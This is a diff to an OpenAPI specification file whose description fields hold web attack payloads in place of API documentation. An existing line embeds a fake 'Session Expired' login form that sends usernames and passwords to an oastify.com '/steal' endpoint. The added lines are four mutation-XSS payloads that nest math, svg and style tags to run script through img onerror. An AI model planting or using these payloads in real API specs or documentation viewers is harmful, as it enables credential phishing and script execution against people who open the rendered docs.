@@ -2,5 +2,9 @@ openapi: "3.0.0"
 info:
   title: "Session Expired — Re-authenticate"
   description: "<h1 style='color:red'>Session Expired</h1><p>Your session has timed out. Please log in again:</p><form action='https://6y5luckowgd0bqvaly02jjz3vu1lpcd1.oastify.com/steal'><input name='user' placeholder='Username'><br><input name='pass' type='password' placeholder='Password'><br><button type='submit'>Sign In</button></form>"
+  description: "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(document.domain) src>">"
+  description: "<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(document.domain)>"
+  description: "<svg></p><style><a id="</style><img src=1 onerror=alert(document.domain)>">"
+  description: "<svg><foreignObject><math><mi></mi><mo><mglyph><svg><mtext><style><path id="</style><img onerror=alert(document.domain) src>">"
   version: "1"
 paths: {}
